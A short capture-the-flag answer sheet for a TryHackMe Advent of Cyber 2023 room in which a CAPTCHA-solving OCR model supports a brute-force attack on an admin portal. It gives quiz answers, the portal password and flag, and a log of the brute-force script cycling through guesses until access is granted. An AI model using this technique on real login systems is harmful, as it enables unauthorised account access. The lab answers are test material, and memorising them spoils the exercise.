



### Answer the questions below

**What key process of training a neural network is taken care of by using a CNN?**

Feature Extraction

**What is the name of the process used in the CNN to extract the features?**  

Convolution

**What is the name of the process used to reduce the features down?**  

Pooling

**What off-the-shelf CNN did we use to train a CAPTCHA-cracking OCR model?**  

Attention OCR 

**What is the password that McGreedy set on the HQ Admin portal?**  

ReallyNotGonnaGuessThis

**What is the value of the flag that you receive when you successfully authenticate to the HQ Admin portal?**

THM{Captcha.Can't.Hold.Me.Back}



```
cd ~/Desktop/bruteforcer && python3 bruteforce.py

[-] Invalid credential pair -- Username: admin Password: adminadmin
[-] Invalid credential pair -- Username: admin Password: admins
[-] Invalid credential pair -- Username: admin Password: goat
[-] Invalid credential pair -- Username: admin Password: sysadmin
[-] Invalid credential pair -- Username: admin Password: water
[-] Invalid credential pair -- Username: admin Password: dirt
[-] Invalid credential pair -- Username: admin Password: air
[-] Invalid credential pair -- Username: admin Password: earth
[+] Access Granted!! -- Username: admin Password: ReallyNotGonnaGuessThis
```

```
Access Granted.... Flag: THM{Captcha.Can't.Hold.Me.Back}
```





I completed Task 22  [Day 16] Machine learning Can't CAPTCHA this Machine!!, Don't miss out Tryhackme #AdventOfCyber @RealTryHackMe https://tryhackme.com/room/adventofcyber2023